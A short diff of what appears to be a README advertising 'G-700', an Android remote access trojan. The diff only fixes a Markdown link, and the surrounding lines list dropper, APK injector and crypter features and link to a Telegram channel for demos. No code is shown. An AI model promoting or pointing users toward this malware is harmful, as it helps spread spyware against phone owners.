@@ -34,6 +34,6 @@ Advanced Android RAT
 - Dropper/apk injector / apk Crypter
 - And More functions
 
-#### [G-700 about(https://t.me/G700_RAT)
+#### [G-700 about](https://t.me/G700_RAT)
 
 ## [Vedios & Demo](https://t.me/G700_RAT)
